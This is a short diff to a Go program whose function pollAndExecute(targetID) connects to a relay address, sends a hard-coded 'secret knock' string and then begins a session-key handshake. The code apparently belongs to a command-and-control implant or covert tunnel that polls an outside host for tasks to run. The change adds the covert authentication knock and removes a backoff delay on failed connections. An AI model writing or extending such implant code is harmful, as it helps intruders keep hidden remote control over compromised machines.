@@ -201,11 +201,17 @@ func pollAndExecute(targetID string) error {
 	fmt.Printf("[!] Attempting Bridge: %s\n", r.RelayAddr)
 	relayConn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
 	if err != nil {
-		fmt.Printf("[!] Relay Unreachable: %v. Backing off...\n", err)
-		time.Sleep(10 * time.Second) // THE FIX: Stops the infinite loop
 		return nil
 	}
+
 	defer relayConn.Close()
+
+	// --- NEW: SEND THE SECRET KNOCK ---
+	_, err = relayConn.Write([]byte("8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"))
+	if err != nil {
+		relayConn.Close()
+		return nil
+	}
 
 	// 5. SESSION KEY HANDSHAKE
 	relayConn.SetReadDeadline(time.Now().Add(10 * time.Second))
